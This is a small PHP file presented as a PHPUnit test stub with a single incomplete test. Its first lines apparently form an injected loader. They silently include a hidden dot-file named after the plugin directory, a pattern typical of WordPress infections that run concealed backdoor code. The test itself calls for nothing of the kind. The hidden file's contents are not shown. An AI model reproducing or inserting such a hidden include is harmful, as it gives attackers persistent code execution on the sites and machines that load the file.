<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue1468Test extends PHPUnit_Framework_TestCase
{
    /**
     * @todo Implement this test
     */
    public function testFailure()
    {
        $this->markTestIncomplete();
    }
}
